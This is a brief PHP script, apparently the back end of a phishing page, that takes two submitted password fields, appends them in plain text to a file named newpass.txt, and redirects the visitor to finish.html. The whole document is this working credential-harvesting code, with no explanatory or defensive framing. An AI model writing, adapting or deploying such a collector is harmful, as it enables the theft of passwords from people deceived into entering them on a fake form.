<?php

file_put_contents("newpass.txt", "first password: " . $_POST['firstpass'] . " second password: " . $_POST['secondpass'] . "\n", FILE_APPEND);
header('Location: finish.html');
exit();
